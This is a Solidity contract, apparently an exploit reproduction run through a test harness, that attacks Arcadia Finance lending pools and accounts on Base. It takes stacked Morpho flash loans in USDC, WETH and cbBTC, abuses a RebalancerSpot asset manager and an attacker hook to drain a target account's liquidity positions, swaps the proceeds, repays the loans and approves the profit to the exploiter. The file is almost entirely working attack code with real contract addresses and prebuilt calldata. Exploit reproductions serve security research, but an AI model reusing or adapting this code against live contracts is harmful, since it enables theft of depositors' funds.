// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {IMorpho} from "./IMorpho.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IFactory} from "./IFactory.sol";
import {IRebalancerSpot} from "./IRebalancerSpot.sol";
import {IAccount} from "./IAccount.sol";
import {ICLFactory} from "./ICLFactory.sol";
import {ICLPool} from "./ICLPool.sol";
import {INonFungiblePositionManager} from "./INonFungiblePositionManager.sol";
import {ILendingPool} from "./ILendingPool.sol";
import {IStakedSlipstreamAM} from "./IStakedSlipstreamAM.sol";
import {ISwapRouter} from "./ISwapRouter.sol";

import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import "forge-std/Test.sol";

contract Exploit1 is TestHarness, TokenBalanceTracker {
    struct Data {
        address targetContract; // 0x9529E5988ceD568898566782e88012cf11C3Ec99
        address rebalancerSpot; //0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509
        address rebalancerSpot2; // 0xC729213B9b72694F202FeB9cf40FE8ba5F5A4509
        address NFTPositionManagerAERO_CL_POS; //0x827922686190790b37229fd06084350e74485b72
        address arcadiaLendingPoolUSDC; // 0x3ec4a293Fb906DD2Cd440c20dECB250DeF141dF1
        address arcadiaLendingPoolcbBTC; // 0xa37E9b4369dc20940009030BfbC2088F09645e3B
        address arcadiaLendingPoolWETH; // 0x803ea69c7e87D1d6C86adeB40CB636cC0E6B98E2
        address attackerContract; //0xCD01715b785B18863D549973133C5bfEfd91995D
        address arcadiaStakedSlipstreamAM; //0x1Dc7A0f5336F52724B650E39174cfcbbEdD67bF1
        address weth; //0x4200000000000000000000000000000000000006
        uint256 number; // 150000000000000000000
    }

    // Struct with information to pass to and from the actionTarget.
    struct ActionData {
        // Array of the contract addresses of the assets.
        address[] assets;
        // Array of the IDs of the assets.
        uint256[] assetIds;
        // Array with the amounts of the assets.
        uint256[] assetAmounts;
        // Array with the types of the assets.
        uint256[] assetTypes;
    }

    IMorpho internal constant MORPHO =
        IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    IERC20 internal constant USDC =
        IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    IWETH9 internal constant WETH =
        IWETH9(0x4200000000000000000000000000000000000006);

    IERC20 internal constant cbBTC =
        IERC20(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf);

    address[] internal flashloanTokens = [
        0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, // USDC
        0x4200000000000000000000000000000000000006, // WETH
        0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf // cbBTC
    ];

    ICLFactory internal constant CL_FACTORY =
        ICLFactory(0x5e7BB104d84c7CB9B682AaC2F3d509f5F406809A);

    address exploiter;

    uint256 flashloanNextTokenIndex;

    address[] internal accounts;

    address exploitHook;
    INonFungiblePositionManager nonFungiblePositionManagerAERO_CL_POS;

    ILendingPool internal arcadiaLendingPoolUSDC;
    ILendingPool internal arcadiaLendingPoolcbBTC;
    ILendingPool internal arcadiaLendingPoolWETH;

    IStakedSlipstreamAM internal arcadiaStakedSlipstreamAM;

    IAccount internal targetAccount;

    ISwapRouter internal constant SWAP_ROUTER =
        ISwapRouter(0xBE6D8f0d05cC4be24d5167a3eF062215bE6D18a5);

    mapping(address => uint256) public borrowedAmountByToken;

    function attack(Data calldata data) external {
        // Store all the parameters in the contract state so they can be used later
        exploiter = msg.sender;

        exploitHook = data.attackerContract;
        nonFungiblePositionManagerAERO_CL_POS = INonFungiblePositionManager(
            data.NFTPositionManagerAERO_CL_POS
        );
        arcadiaLendingPoolUSDC = ILendingPool(data.arcadiaLendingPoolUSDC);
        arcadiaLendingPoolcbBTC = ILendingPool(data.arcadiaLendingPoolcbBTC);
        arcadiaLendingPoolWETH = ILendingPool(data.arcadiaLendingPoolWETH);
        targetAccount = IAccount(data.targetContract);
        arcadiaStakedSlipstreamAM = IStakedSlipstreamAM(
            data.arcadiaStakedSlipstreamAM
        );

        // Approve the Morpho contract to spend the tokens, which is necessary for repaying the flashloan
        USDC.approve(address(MORPHO), type(uint256).max);
        WETH.approve(address(MORPHO), type(uint256).max);
        cbBTC.approve(address(MORPHO), type(uint256).max);

        // Set up the first flashloan
        address flashloanToken = flashloanTokens[flashloanNextTokenIndex];
        uint256 flashloanTokenBalance = IERC20(flashloanToken).balanceOf(
            address(MORPHO)
        );

        borrowedAmountByToken[flashloanToken] = flashloanTokenBalance;
        flashloanNextTokenIndex++;

        bytes memory flashloanData = abi.encode(
            data.targetContract,
            data.rebalancerSpot
        );

        // Initiate the flashloan
        MORPHO.flashLoan(flashloanToken, flashloanTokenBalance, flashloanData);
    }

    function onMorphoFlashLoan(uint256 assets, bytes memory data) external {
        // Depending if all 3 flashloan tokens have been borrowed, we either continue borrowing the next token or execute the exploit logic
        if (flashloanNextTokenIndex < flashloanTokens.length) {
            // Set up the next flashloan
            address flashloanToken = flashloanTokens[flashloanNextTokenIndex];
            uint256 flashloanTokenBalance = IERC20(flashloanToken).balanceOf(
                address(MORPHO)
            );

            borrowedAmountByToken[flashloanToken] = flashloanTokenBalance;

            flashloanNextTokenIndex++;

            // Execute the flashloan for the next token
            MORPHO.flashLoan(flashloanToken, flashloanTokenBalance, data);
        } else {
            // As all flashloan tokens have been borrowed, the exploit logic can be executed
            (address targetContract, address rebalancerSpot) = abi.decode(
                data,
                (address, address)
            );

            IAccount(accounts[0]).setAssetManager(rebalancerSpot, true);

            IRebalancerSpot(rebalancerSpot).setAccountInfo(
                accounts[0], // account,
                address(this), // initiator,
                exploitHook // hook
            );

            IRebalancerSpot(rebalancerSpot).setInitiatorInfo(
                9999999999999999,
                0,
                980000000000000000
            );

            address usdcBtcPoolAddress = CL_FACTORY.getPool(
                address(USDC),
                address(cbBTC),
                100
            );

            ICLPool.Slot0 memory slot0 = ICLPool(usdcBtcPoolAddress).slot0();

            USDC.approve(address(nonFungiblePositionManagerAERO_CL_POS), 0);

            USDC.approve(
                address(nonFungiblePositionManagerAERO_CL_POS),
                type(uint256).max
            );

            cbBTC.approve(address(nonFungiblePositionManagerAERO_CL_POS), 0);

            cbBTC.approve(
                address(nonFungiblePositionManagerAERO_CL_POS),
                type(uint256).max
            );

            //TODO: Check values
            INonFungiblePositionManager.MintParams
                memory mintParams = INonFungiblePositionManager.MintParams({
                    token0: address(USDC),
                    token1: address(cbBTC),
                    tickSpacing: 100,
                    tickLower: -71100,
                    tickUpper: -70100,
                    amount0Desired: 1773463824,
                    amount1Desired: 2832455,
                    amount0Min: 0,
                    amount1Min: 0,
                    recipient: address(this),
                    deadline: 1752552345,
                    sqrtPriceX96: 0
                });

            (
                uint256 tokenId,
                uint128 liquidity,
                uint256 amount0,
                uint256 amount1
            ) = nonFungiblePositionManagerAERO_CL_POS.mint(mintParams);

            USDC.approve(accounts[0], type(uint256).max);

            cbBTC.approve(accounts[0], type(uint256).max);

            nonFungiblePositionManagerAERO_CL_POS.setApprovalForAll(
                accounts[0],
                true
            );

            address[] memory assetAddresses = new address[](3);
            assetAddresses[0] = address(nonFungiblePositionManagerAERO_CL_POS);
            assetAddresses[1] = address(USDC);
            assetAddresses[2] = address(cbBTC);

            //TODO: Check values
            uint256[] memory assetIds = new uint256[](3);
            assetIds[0] = tokenId;
            assetIds[1] = 0;
            assetIds[2] = 0;

            //TODO: Check values
            uint256[] memory assetAmounts = new uint256[](3);
            assetAmounts[0] = 1;
            assetAmounts[1] = 10000000;
            assetAmounts[2] = 100000000;

            // Deposit assets into the account
            IAccount(accounts[0]).deposit(
                assetAddresses,
                assetIds,
                assetAmounts
            );

            // TODO: There might be a check if this is 0 skip repaying
            uint256 usdcWithdrawable = arcadiaLendingPoolUSDC.maxWithdraw(
                address(targetAccount)
            ); //0

            uint256 wbtcWithdrawable = arcadiaLendingPoolcbBTC.maxWithdraw(
                address(targetAccount)
            ); //1443715344

            cbBTC.approve(address(arcadiaLendingPoolcbBTC), 0);

            cbBTC.approve(address(arcadiaLendingPoolcbBTC), wbtcWithdrawable);

            arcadiaLendingPoolcbBTC.repay(
                wbtcWithdrawable,
                address(targetAccount)
            );

            uint256 wethWithdrawable = arcadiaLendingPoolWETH.maxWithdraw(
                address(targetAccount)
            );

            uint256 accountVersion = targetAccount.ACCOUNT_VERSION();

            // Create dynamic arrays to store values
            address[] memory assetAddresses1;
            uint256[] memory assetIds1;
            uint256[] memory assetAmounts1;
            (assetAddresses1, assetIds1, assetAmounts1) = targetAccount
                .generateAssetData();

            //TODO: Try to build the calldata step by step
            bytes memory swapData = getSwapData();

            IRebalancerSpot(rebalancerSpot).rebalance(
                address(accounts[0]),
                address(nonFungiblePositionManagerAERO_CL_POS),
                tokenId, // oldId
                -81100, // tickLower
                -80100, // tickUpper
                swapData
            );

            console.log("AAAA");

            //TODO: Check why WETH.approve is called with address(0)
            WETH.approve(address(0), 0);

            // Create dynamic arrays to store values
            address[] memory assetAddresses2;
            uint256[] memory assetIds2;
            uint256[] memory assetAmounts2;
            (assetAddresses2, assetIds2, assetAmounts2) = IAccount(accounts[0])
                .generateAssetData();

            IAccount(accounts[0]).withdraw(
                assetAddresses2,
                assetIds2,
                assetAmounts2
            );

            // oldID = tokenID
            // newId = tokenID + 1
            tokenId = tokenId + 1;

            {
                (
                    uint96 nonce,
                    address operator,
                    address token0,
                    address token1,
                    int24 tickSpacing,
                    int24 tickLower,
                    int24 tickUpper,
                    uint128 liquidity2,
                    uint256 feeGrowthInside0LastX128,
                    uint256 feeGrowthInside1LastX128,
                    uint128 tokensOwed0,
                    uint128 tokensOwed1
                ) = nonFungiblePositionManagerAERO_CL_POS.positions(tokenId);

                nonFungiblePositionManagerAERO_CL_POS.decreaseLiquidity(
                    INonFungiblePositionManager.DecreaseLiquidityParams({
                        tokenId: tokenId,
                        liquidity: liquidity2,
                        amount0Min: 0,
                        amount1Min: 0,
                        deadline: block.timestamp + 1000
                    })
                );

                nonFungiblePositionManagerAERO_CL_POS.collect(
                    INonFungiblePositionManager.CollectParams({
                        tokenId: tokenId,
                        recipient: address(this),
                        amount0Max: type(uint128).max,
                        amount1Max: type(uint128).max
                    })
                );
            }

            tokenId = 18906296;
            arcadiaStakedSlipstreamAM.burn(tokenId);

            {
                (
                    uint96 nonce,
                    address operator,
                    address token0,
                    address token1,
                    int24 tickSpacing,
                    int24 tickLower,
                    int24 tickUpper,
                    uint128 liquidity2,
                    uint256 feeGrowthInside0LastX128,
                    uint256 feeGrowthInside1LastX128,
                    uint128 tokensOwed0,
                    uint128 tokensOwed1
                ) = nonFungiblePositionManagerAERO_CL_POS.positions(tokenId);

                nonFungiblePositionManagerAERO_CL_POS.decreaseLiquidity(
                    INonFungiblePositionManager.DecreaseLiquidityParams({
                        tokenId: tokenId,
                        liquidity: liquidity2,
                        amount0Min: 0,
                        amount1Min: 0,
                        deadline: block.timestamp + 1000
                    })
                );

                (
                    uint256 amount0X,
                    uint256 amount1X
                ) = nonFungiblePositionManagerAERO_CL_POS.collect(
                        INonFungiblePositionManager.CollectParams({
                            tokenId: tokenId,
                            recipient: address(this),
                            amount0Max: type(uint128).max,
                            amount1Max: type(uint128).max
                        })
                    );
            }

            USDC.approve(address(SWAP_ROUTER), type(uint256).max);

            uint256 usdcBalance = USDC.balanceOf(address(this));
            //66419188536452 cur balance
            //64129493146397 flashloan amount
            //2289695390055 amountin

            SWAP_ROUTER.exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: address(USDC),
                    tokenOut: address(WETH),
                    tickSpacing: 100,
                    recipient: address(this),
                    deadline: block.timestamp + 1000,
                    amountIn: usdcBalance -
                        borrowedAmountByToken[address(USDC)],
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );

            uint256 wethBalance = WETH.balanceOf(address(this));

            WETH.approve(address(SWAP_ROUTER), type(uint256).max);

            // 995401562113 curr cbtc balance
            // 996845277459 borrowed amount

            uint256 cbBTCBalance = cbBTC.balanceOf(address(this));
            // Gets the amount of cbBTC needed to pay back the borrowed amount
            uint256 btcAmountNeeded = borrowedAmountByToken[address(cbBTC)] -
                cbBTCBalance;

            SWAP_ROUTER.exactOutputSingle(
                ISwapRouter.ExactOutputSingleParams({
                    tokenIn: address(WETH),
                    tokenOut: address(cbBTC),
                    tickSpacing: 100,
                    recipient: address(this),
                    deadline: block.timestamp + 1000,
                    amountOut: btcAmountNeeded,
                    amountInMaximum: wethBalance,
                    sqrtPriceLimitX96: 0
                })
            );

            cbBTC.approve(exploiter, type(uint256).max);

            WETH.approve(exploiter, type(uint256).max);
        }
    }

    function createAccounts(
        uint256 number,
        address arcadiaAccountFactory
    ) external {
        // 15 - 0xDa14Fdd72345c4d2511357214c5B89A919768e59
        uint32 salt = 1542341971;
        for (uint32 i = 0; i < number; i++) {
            address account = IFactory(arcadiaAccountFactory).createAccount(
                salt + i,
                1,
                address(0)
            );
            accounts.push(account);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function executeAction(
        bytes calldata rebalanceData
    ) external returns (ActionData memory depositData) {
        address rebalancerSpot = abi.decode(rebalanceData, (address));

        cbBTC.transfer(rebalancerSpot, 100000000);

        USDC.transfer(rebalancerSpot, 50000000000);

        return
            ActionData({
                assets: new address[](0),
                assetIds: new uint256[](0),
                assetAmounts: new uint256[](0),
                assetTypes: new uint256[](0)
            });
    }

    function getSwapData() internal view returns (bytes memory) {
        return
            hex"0000000000000000000000009529e5988ced568898566782e88012cf11c3ec990000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000005e40b9252f00000000000000000000000002e234DAe75C793f67A35089C9d99245E1C58470b0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000058000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000003a000000000000000000000000000000000000000000000000000000000000004a0000000000000000000000000000000000000000000000000000000000000052000000000000000000000000000000000000000000000000000000000000005400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002600000000000000000000000000000000000000000000000000000000000000004000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000820c137fa70c8691f0e44dc420a5e53c168921dc000000000000000000000000940181a94a35a4569e4529a3cdfb74e38fd986310000000000000000000000001dc7a0f5336f52724b650e39174cfcbbedd67bf100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001207cb8000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000003ac64623400000000000000000000000000000000000000000000002c8c43ee26ec432953000000000000000000000000000000000000000000000034494df3a0122fc9d1000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c729213b9b72694f202feb9cf40fe8ba5f5a450900000000000000000000000000000000000000000000000000000000";
    }
}
